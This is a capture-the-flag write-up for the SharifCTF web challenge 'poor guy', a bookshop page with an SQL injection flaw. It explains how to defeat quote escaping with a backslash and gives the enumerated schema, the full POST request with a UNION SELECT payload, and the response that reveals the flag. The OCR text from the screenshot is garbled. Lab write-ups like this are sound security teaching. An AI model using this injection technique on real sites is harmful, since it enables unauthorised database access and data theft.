# poor guy (web, 150p)

url : http://ctf.sharif.edu:8086/index.php


[image extracted text: bookshop
profile
books
book serial
1add book
add your books here with their serial
we sent you with
email:
poor people
view
select
book for viewing among those you already have.
console
html
css
scrpt
dom
net
cookies
clear
persist
html
css
javascript
xhr
images
plugins
media
fonts
status
domain
size
remote
post indexphp
200 ok
ctf snarif.edu.8086
1.6 kb
213.233.175.130.8086
headers
post
response
html
cache
cookies
parameters
application/x-
torm-urlencaded
do not sort
book_selection
0790060878b40
source
book selection-9780060878849]


sql injection with single quote replacing ' (single-quote) into \' , so by sending \' it gets replaced into \\' , which will treat backslash as non-special sign and quote as special. after making some enumeration we have found out some more details about db : 

```
database : book_shop
table : books 
some of the columns :
	book_id
	book_name
	book_serial
	book_isbn
	book_cover
	is_premium
```

therefore , performing post request :
```
post /index.php http/1.1
host: ctf.sharif.edu:8086
[...]

book_selection=\' or true union select 1,2,3,4,5,6,book_serial,8 from book_shop.books limit 1 offset 5; #
```

we obtain flag sharifctf{931b20ec7700a61e5d280888662757af} in the response :
```
[...]
<img src="sharifctf{931b20ec7700a61e5d280888662757af}" class="img-rounded img-responsive" style="width:100%" alt="rounded image">
[...]
```
